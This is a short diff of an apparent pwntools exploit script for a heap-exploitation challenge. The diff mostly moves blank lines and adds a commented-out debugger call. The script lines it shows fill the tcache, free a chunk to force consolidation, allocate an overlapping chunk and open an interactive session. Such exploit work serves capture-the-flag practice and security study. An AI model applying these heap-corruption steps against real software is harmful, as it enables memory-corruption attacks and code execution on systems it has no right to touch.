@@ -37,16 +37,17 @@ p.sendline("read_copy 2")
 p.sendline(b'B' * 0x20 + p64(0x60))
 
 
+
 # filling up tcache so that it goes into unsortedbin
 for i in range(4, 11):
 	p.sendline(f"malloc {i} 248")
 for i in range(4, 11):
 	p.sendline(f"free {i}")
-
-
-
 # freeing chunk C and it starts to consolidate now!
 p.sendline("free 3")
+
+
+
 
 # malloc(0x158) to get the chunk, we call this the chunk D
 p.sendline("malloc 11 344") 
@@ -79,5 +80,5 @@ p.sendline("puts 14")
 
 
 
-
+#gdb.attach(p,s)
 p.interactive()
